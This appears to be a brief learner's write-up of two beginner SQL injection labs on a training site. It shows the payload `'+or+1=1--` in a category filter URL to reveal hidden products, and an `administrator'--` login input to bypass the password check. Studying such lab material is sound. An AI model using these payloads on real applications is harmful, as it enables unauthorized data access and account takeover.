```'+or+1=1--```

```'adminstrator--```

1. First of all in sqli the very basic is we have to find a input where we can performe the sql command .
such as here is a example :

```https://0aae009d03fc169e8a3efa9100a90037.web-security-academy.net/filter?category=Lifestyle```

here we got category where we give them a type like Lifestyle etc etc and they give back us the product but how can we see all the products which has not even permits to show us    so we can do 

```https://0aae009d03fc169e8a3efa9100a90037.web-security-academy.net/filter?category='+or+1=1--```

2. Now perform a SQL injection attack that logs in to the application as the administrator user.
In the login form i just gave the user name administrator and using '-- comments out the rest
